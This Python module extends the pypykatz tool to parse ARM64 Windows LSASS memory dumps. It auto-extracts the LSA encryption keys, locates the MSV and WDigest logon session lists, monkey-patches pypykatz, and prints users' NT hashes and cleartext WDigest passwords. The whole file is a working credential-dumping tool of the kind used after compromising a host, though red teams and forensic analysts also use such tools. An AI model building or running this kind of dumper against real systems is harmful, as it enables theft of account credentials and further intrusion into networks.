#!/usr/bin/env python3
"""ARM64 LSASS dump parser — extends pypykatz for ARM64 support.

pypykatz only supports x86/x64 LSASS dumps because it relies on architecture-
specific byte signatures to locate crypto keys and credential linked lists in
memory.  ARM64 Windows uses completely different instruction encodings, so all
code-signature scans fail.

This module works around the limitation by:
1. Auto-extracting LSA crypto material (IV, AES, 3DES keys) from the dump by
   scanning for BCRYPT_HANDLE_KEY (RUUU) / BCRYPT_KEY (KSSM) structures
2. Auto-finding LogonSessionList and l_LogSessList by scanning .data sections
   for pointers that start doubly-linked lists with valid credential entries
3. Letting pypykatz's struct parsers (which are arch-agnostic for 64-bit)
   handle the actual credential extraction and decryption

Usage (standalone):
    python -m pypykatz.lsadecryptor.arm64 <dump_path> [--json]

Usage (as library):
    from pypykatz.lsadecryptor.arm64 import parse_arm64_dump
    pypykatz_data = parse_arm64_dump("/path/to/dump.dmp")
"""

from __future__ import annotations

import argparse
import json
import logging
import struct
import traceback
from typing import Any

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Auto-extraction: LSA crypto material
# ---------------------------------------------------------------------------

RUUU_TAG = b"\x52\x55\x55\x55"  # 0x55555552 LE
KSSM_TAG = b"\x4b\x53\x53\x4d"  # 0x4d53534b LE


def _find_module_data_section(reader, module_name: str):
    """Find a module's .data section VA and size from the minidump."""
    for mod in reader.reader.modules:
        name = getattr(mod, "name", "") or ""
        if module_name.lower() not in name.lower():
            continue
        base = mod.baseaddress
        # Read PE header to find .data
        try:
            reader.move(base)
            mz = reader.read(2)
            if mz != b"MZ":
                continue
            reader.move(base + 0x3C)
            pe_offset = struct.unpack("<I", reader.read(4))[0]
            reader.move(base + pe_offset + 6)
            num_sections = struct.unpack("<H", reader.read(2))[0]
            reader.move(base + pe_offset + 0x14)
            opt_hdr_size = struct.unpack("<H", reader.read(2))[0]
            section_start = base + pe_offset + 0x18 + opt_hdr_size
            for i in range(num_sections):
                reader.move(section_start + i * 40)
                sec_name = reader.read(8).rstrip(b"\x00").decode("ascii", errors="replace")
                vsize = struct.unpack("<I", reader.read(4))[0]
                va = struct.unpack("<I", reader.read(4))[0]
                if sec_name == ".data":
                    return base + va, vsize, base
        except Exception:
            continue
    return None, None, None


def _read_qword(reader, addr: int) -> int | None:
    """Read an 8-byte little-endian value from the minidump."""
    try:
        reader.move(addr)
        return struct.unpack("<Q", reader.read(8))[0]
    except Exception:
        return None


def _read_bytes(reader, addr: int, size: int) -> bytes | None:
    """Read raw bytes from the minidump."""
    try:
        reader.move(addr)
        return reader.read(size)
    except Exception:
        return None


def _check_tag(reader, addr: int, tag: bytes) -> bool:
    """Check if the 4 bytes at addr+4 match the given tag."""
    data = _read_bytes(reader, addr + 4, 4)
    return data == tag


def extract_lsa_keys(reader) -> tuple[bytes, bytes, bytes] | None:
    """Auto-extract IV, AES key, and 3DES key from an ARM64 LSASS dump.

    Strategy: scan lsasrv.dll .data for adjacent pointer pairs that point to
    RUUU (BCRYPT_HANDLE_KEY) structures in heap. The 16 bytes immediately
    before the first such pointer is the IV. Each RUUU structure contains a
    pointer to a KSSM (BCRYPT_KEY) structure holding the actual key material.

    Returns (iv, aes_key, des_key) or None if extraction fails.
    """
    data_va, data_size, _ = _find_module_data_section(reader, "lsasrv.dll")
    if data_va is None:
        logger.info("arm64: lsasrv.dll .data section not found")
        return None

    # Scan .data for QWORD pairs where both point to RUUU structures.
    # IV is the 16 bytes immediately before the first RUUU pointer.
    # Read QWORDs individually to avoid segment-boundary issues.
    candidates = []
    for off in range(0, data_size - 16, 8):
        val = _read_qword(reader, data_va + off)
        if val is None:
            continue
        if 0x100_0000_0000 < val < 0x7FFF_FFFF_FFFF:
            if _check_tag(reader, val, RUUU_TAG):
                candidates.append((off, val))

    # Find adjacent RUUU pointers (within 16 bytes of each other)
    for i in range(len(candidates) - 1):
        off1, ruuu_addr1 = candidates[i]
        off2, ruuu_addr2 = candidates[i + 1]
        if off2 - off1 in (8, 16):
            # Found a pair — IV is the 16 bytes before the first pointer
            iv_offset = off1 - 16
            if iv_offset < 0:
                continue
            iv = _read_bytes(reader, data_va + iv_offset, 16)
            if iv is None:
                continue

            # Follow RUUU → KSSM → key data
            key1 = _extract_key_from_ruuu(reader, ruuu_addr1)
            key2 = _extract_key_from_ruuu(reader, ruuu_addr2)

            if key1 is None or key2 is None:
                continue

            # Classify: 24-byte = 3DES, 16-byte = AES
            des_key = aes_key = None
            for k in (key1, key2):
                if len(k) == 24:
                    des_key = k
                elif len(k) == 16:
                    aes_key = k

            if des_key and aes_key:
                logger.info("arm64: extracted IV=%s", iv.hex())
                logger.info("arm64: extracted AES key (%dB)", len(aes_key))
                logger.info("arm64: extracted 3DES key (%dB)", len(des_key))
                return iv, aes_key, des_key

    logger.info("arm64: found %d RUUU pointers but no adjacent pair with valid keys", len(candidates))
    return None


def _extract_key_from_ruuu(reader, ruuu_addr: int) -> bytes | None:
    """Follow RUUU → KSSM chain to extract raw key bytes.

    BCRYPT_HANDLE_KEY (RUUU):
      +0x00: ULONG size
      +0x04: "RUUU" tag
      +0x08: PVOID hAlgorithm
      +0x10: PVOID pKey → BCRYPT_KEY (KSSM)

    BCRYPT_KEY (KSSM) layout (Win10/11):
      +0x00: ULONG size
      +0x04: "KSSM" tag
      +0x08: ULONG type (2 DWORDs)
      +0x10: ULONG mode (2 DWORDs)
      +0x18: ULONG64 unk
      +0x20: PVOID unk
      +0x28: 8 bytes padding/data
      +0x30: 8 bytes padding
      +0x38: ULONG cbSecret (KIWI_HARD_KEY.cbSecret)
      +0x3C: BYTE[cbSecret] key data
    """
    # Read RUUU → pKey pointer at +0x10
    kssm_ptr = _read_qword(reader, ruuu_addr + 0x10)
    if kssm_ptr is None or kssm_ptr == 0:
        return None

    # Verify KSSM tag
    if not _check_tag(reader, kssm_ptr, KSSM_TAG):
        return None

    # HARDKEY is at +0x38: ULONG cbSecret followed by key bytes
    data = _read_bytes(reader, kssm_ptr + 0x38, 4)
    if data is None:
        return None
    cb_secret = struct.unpack("<I", data)[0]
    if cb_secret == 0 or cb_secret > 64:
        return None
    return _read_bytes(reader, kssm_ptr + 0x3C, cb_secret)


# ---------------------------------------------------------------------------
# Auto-extraction: LogonSessionList and l_LogSessList
# ---------------------------------------------------------------------------

def _is_valid_unicode_string(reader, addr: int) -> str | None:
    """Try to read a UNICODE_STRING struct at addr and return the string.

    UNICODE_STRING layout (64-bit):
      +0x00: USHORT Length (in bytes)
      +0x02: USHORT MaximumLength
      +0x04: padding (4 bytes for alignment)
      +0x08: PVOID Buffer
    """
    data = _read_bytes(reader, addr, 16)
    if data is None:
        return None
    length, max_length = struct.unpack_from("<HH", data, 0)
    buf_ptr = struct.unpack_from("<Q", data, 8)[0]
    if length == 0 or length > 512 or max_length < length or buf_ptr == 0:
        return None
    if buf_ptr < 0x100_0000_0000:
        return None
    raw = _read_bytes(reader, buf_ptr, length)
    if raw is None:
        return None
    try:
        text = raw.decode("utf-16-le")
        if all(c.isprintable() or c in ("\x00",) for c in text):
            return text
    except Exception:
        pass
    return None


def _walk_list_count(reader, head_addr: int, max_walk: int = 30) -> int:
    """Walk a doubly-linked list from head and count entries."""
    first_flink = _read_qword(reader, head_addr)
    if first_flink is None or first_flink == 0 or first_flink == head_addr:
        return 0

    count = 0
    seen = {head_addr}
    ptr = first_flink
    while ptr not in seen and count < max_walk:
        seen.add(ptr)
        count += 1
        next_ptr = _read_qword(reader, ptr)
        if next_ptr is None or next_ptr == 0:
            break
        ptr = next_ptr
    return count


def find_logon_session_list(reader) -> int | None:
    """Find LogonSessionList address in lsasrv.dll .data section.

    Scans for pointers that start valid linked lists where entries contain
    UNICODE_STRING fields at the offsets matching KIWI_MSV1_0_LIST_65
    (+0xa0 = UserName, +0xb0 = DomainName).
    """
    data_va, data_size, _ = _find_module_data_section(reader, "lsasrv.dll")
    if data_va is None:
        return None

    best_addr = None
    best_count = 0

    for off in range(0, data_size - 8, 8):
        val = _read_qword(reader, data_va + off)
        if val is None or val < 0x100_0000_0000 or val > 0x7FFF_FFFF_FFFF:
            continue

        addr = data_va + off
        count = _walk_list_count(reader, addr, max_walk=30)
        if count < 3:
            continue

        # Check first entry for UNICODE_STRING at MSV offsets (+0xa0, +0xb0)
        first_entry = _read_qword(reader, addr)
        if first_entry is None:
            continue

        username = _is_valid_unicode_string(reader, first_entry + 0xA0)
        domain = _is_valid_unicode_string(reader, first_entry + 0xB0)
        if username and domain:
            is_real_user = not username.endswith("$") and username != ""
            best_is_real = getattr(find_logon_session_list, "_best_real", False)
            # Prefer: real user > machine account, then most entries
            if best_addr is None or (is_real_user and not best_is_real) or \
               (is_real_user == best_is_real and count > best_count):
                best_count = count
                best_addr = addr
                find_logon_session_list._best_real = is_real_user
                logger.info("arm64: MSV list candidate @ 0x%x (%d entries, first=%s\\%s)", addr, count, domain, username)

    if best_addr:
        logger.info("arm64: selected LogonSessionList @ 0x%x (%d entries)", best_addr, best_count)
    return best_addr


def find_wdigest_list(reader) -> int | None:
    """Find l_LogSessList address in wdigest.dll .data section.

    WdigestListEntry has username at +0x30 and domain at +0x40 (via
    this_entry + primary_offset where primary_offset=48=0x30).
    But the raw struct has Flink(8) + Blink(8) + usage_count(4) + pad(4) +
    this_entry(8) + luid(8) = 40 bytes header, then credentials start at
    this_entry.value + 0x30.

    Simpler approach: scan for linked list heads, validate by checking for
    UNICODE_STRINGs at known credential offsets from the this_entry pointer.
    """
    data_va, data_size, _ = _find_module_data_section(reader, "wdigest.dll")
    if data_va is None:
        logger.info("arm64: wdigest.dll .data section not found")
        return None

    best_addr = None
    best_count = 0

    for off in range(0, data_size - 8, 8):
        val = _read_qword(reader, data_va + off)
        if val is None or val < 0x100_0000_0000 or val > 0x7FFF_FFFF_FFFF:
            continue

        addr = data_va + off
        count = _walk_list_count(reader, addr, max_walk=30)
        if count < 3:
            continue

        # Check first entry: this_entry at +0x18, then credentials at
        # this_entry + 0x30 (username) and this_entry + 0x40 (domain)
        first_entry = _read_qword(reader, addr)
        if first_entry is None:
            continue
        this_entry = _read_qword(reader, first_entry + 0x18)
        if this_entry is None or this_entry == 0:
            continue

        username = _is_valid_unicode_string(reader, this_entry + 0x30)
        domain = _is_valid_unicode_string(reader, this_entry + 0x40)
        if username and domain:
            is_real_user = not username.endswith("$") and username != ""
            best_is_real = getattr(find_wdigest_list, "_best_real", False)
            if best_addr is None or (is_real_user and not best_is_real) or \
               (is_real_user == best_is_real and count > best_count):
                best_count = count
                best_addr = addr
                find_wdigest_list._best_real = is_real_user
                logger.info("arm64: WDigest list candidate @ 0x%x (%d entries, first=%s\\%s)", addr, count, domain, username)

    if best_addr:
        logger.info("arm64: selected l_LogSessList @ 0x%x (%d entries)", best_addr, best_count)
    return best_addr


# ---------------------------------------------------------------------------
# Monkey-patching and execution
# ---------------------------------------------------------------------------

def make_arm64_decryptor(iv: bytes, aes_key: bytes, des_key: bytes):
    """Create a drop-in LsaDecryptor replacement with pre-extracted keys."""
    from pypykatz.lsadecryptor.lsa_decryptor_nt6 import LsaDecryptor_NT6

    dec = object.__new__(LsaDecryptor_NT6)
    dec.iv = iv
    dec.aes_key = aes_key
    dec.des_key = des_key
    dec.package_name = "manual"
    return dec


def _patch_msv(logon_session_list_addr: int):
    """Monkey-patch MsvDecryptor.find_first_entry to use a known address."""
    from pypykatz.lsadecryptor.packages.msv.decryptor import MsvDecryptor

    def patched(self):
        self.logon_session_count = 1
        ptr_entry = self.reader.get_ptr(logon_session_list_addr)
        return ptr_entry, logon_session_list_addr

    MsvDecryptor.find_first_entry = patched


def _patch_wdigest(wdigest_list_addr: int):
    """Monkey-patch WdigestDecryptor.find_first_entry to use a known address."""
    from pypykatz.lsadecryptor.packages.wdigest.decryptor import WdigestDecryptor

    def patched(self):
        ptr_entry = self.reader.get_ptr(wdigest_list_addr)
        return ptr_entry, wdigest_list_addr

    WdigestDecryptor.find_first_entry = patched


def parse_arm64_dump(dump_path: str) -> dict[str, Any] | None:
    """Fully automated ARM64 LSASS dump parsing.

    Returns pypykatz-compatible dict with logon_sessions, or None on failure.
    This is the entry point used by _parse.py as a fallback.
    """
    from minidump.minidumpfile import MinidumpFile
    from pypykatz.commons.common import KatzSystemArchitecture, KatzSystemInfo
    from pypykatz.pypykatz import pypykatz as katz

    logger.info("arm64: attempting ARM64 LSASS parse")

    minidump = MinidumpFile.parse(dump_path)
    reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=10 * 1024)
    sysinfo = KatzSystemInfo.from_minidump(minidump)
    sysinfo.architecture = KatzSystemArchitecture.X64

    # Step 1: Extract crypto keys
    keys = extract_lsa_keys(reader)
    if keys is None:
        logger.error("arm64: failed to extract LSA crypto keys")
        return None
    iv, aes_key, des_key = keys

    # Step 2: Find linked list addresses
    msv_addr = find_logon_session_list(reader)
    if msv_addr is None:
        logger.error("arm64: failed to find LogonSessionList")
        return None

    wdigest_addr = find_wdigest_list(reader)
    # WDigest is optional (may not be loaded)

    # Step 3: Apply patches and run pypykatz
    mimi = katz(reader, sysinfo)
    mimi.lsa_decryptor = make_arm64_decryptor(iv, aes_key, des_key)
    _patch_msv(msv_addr)
    if wdigest_addr:
        _patch_wdigest(wdigest_addr)

    try:
        mimi.get_logoncreds()
    except Exception as e:
        logger.error("arm64: MSV parsing error: %s", e)

    if wdigest_addr:
        try:
            mimi.get_wdigest()
        except Exception as e:
            logger.error("arm64: WDigest parsing error: %s", e)

    # Step 4: Build pypykatz-compatible JSON dict
    result: dict[str, Any] = {"logon_sessions": {}}
    for luid, session in mimi.logon_sessions.items():
        s: dict[str, Any] = {
            "username": session.username,
            "domainname": session.domainname,
            "msv_creds": [],
            "wdigest_creds": [],
        }
        for cred in session.msv_creds:
            s["msv_creds"].append({
                "NThash": cred.NThash.hex() if cred.NThash else None,
                "LMHash": cred.LMHash.hex() if cred.LMHash else None,
            })
        for cred in session.wdigest_creds:
            s["wdigest_creds"].append({
                "username": cred.username,
                "domainname": cred.domainname,
                "password": cred.password,
            })
        result["logon_sessions"][str(luid)] = s

    n_sessions = len(result["logon_sessions"])
    n_creds = sum(
        len(s["msv_creds"]) + len(s["wdigest_creds"])
        for s in result["logon_sessions"].values()
    )
    logger.info("arm64: extracted %d sessions, %d credential entries", n_sessions, n_creds)
    return result


def is_arm64_dump(dump_path: str) -> bool:
    """Quick check if a minidump contains ARM64 PE modules."""
    from minidump.minidumpfile import MinidumpFile

    try:
        mf = MinidumpFile.parse(dump_path)
        reader = mf.get_reader().get_buffered_reader()
        for mod in reader.reader.modules:
            name = getattr(mod, "name", "") or ""
            if "lsasrv" not in name.lower():
                continue
            base = mod.baseaddress
            reader.move(base + 0x3C)
            pe_off = struct.unpack("<I", reader.read(4))[0]
            reader.move(base + pe_off + 4)
            machine = struct.unpack("<H", reader.read(2))[0]
            return machine == 0xAA64  # IMAGE_FILE_MACHINE_ARM64
    except Exception:
        pass
    return False


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Parse ARM64 LSASS dump")
    parser.add_argument("dump", help="Path to minidump file")
    parser.add_argument("--json", action="store_true", help="Output JSON")
    # Optional manual overrides
    parser.add_argument("--iv", help="LSA IV (hex) — auto-detected if omitted")
    parser.add_argument("--aes", help="AES key (hex)")
    parser.add_argument("--des", help="3DES key (hex)")
    parser.add_argument("--msv-list", help="LogonSessionList addr (hex)")
    parser.add_argument("--wdigest-list", help="l_LogSessList addr (hex)")
    args = parser.parse_args()

    if args.iv and args.aes and args.des and args.msv_list:
        # Manual mode with provided keys/addresses
        from minidump.minidumpfile import MinidumpFile
        from pypykatz.commons.common import KatzSystemArchitecture, KatzSystemInfo
        from pypykatz.pypykatz import pypykatz as katz

        minidump = MinidumpFile.parse(args.dump)
        reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=10 * 1024)
        sysinfo = KatzSystemInfo.from_minidump(minidump)
        sysinfo.architecture = KatzSystemArchitecture.X64

        mimi = katz(reader, sysinfo)
        mimi.lsa_decryptor = make_arm64_decryptor(
            bytes.fromhex(args.iv),
            bytes.fromhex(args.aes),
            bytes.fromhex(args.des),
        )
        _patch_msv(int(args.msv_list, 16))
        if args.wdigest_list:
            _patch_wdigest(int(args.wdigest_list, 16))

        try:
            mimi.get_logoncreds()
        except Exception as e:
            logger.error("MSV error: %s", e)
        if args.wdigest_list:
            try:
                mimi.get_wdigest()
            except Exception as e:
                logger.error("WDigest error: %s", e)

        for luid, session in mimi.logon_sessions.items():
            if session.username and not session.username.endswith("$"):
                for cred in session.msv_creds:
                    nt = cred.NThash.hex() if cred.NThash else "-"
                    print(f"  {session.domainname}\\{session.username}  NT:{nt}")
    else:
        # Auto mode
        result = parse_arm64_dump(args.dump)
        if result and args.json:
            print(json.dumps(result, indent=2, default=str))
        elif result:
            for luid, s in result["logon_sessions"].items():
                user = s.get("username", "")
                domain = s.get("domainname", "")
                if not user or user.endswith("$"):
                    continue
                for cred in s.get("msv_creds", []):
                    nt = cred.get("NThash") or "-"
                    print(f"  {domain}\\{user}  NT:{nt}")
                for cred in s.get("wdigest_creds", []):
                    pwd = cred.get("password") or "-"
                    if pwd != "-":
                        print(f"  {domain}\\{user}  password:{pwd}")


if __name__ == "__main__":
    main()
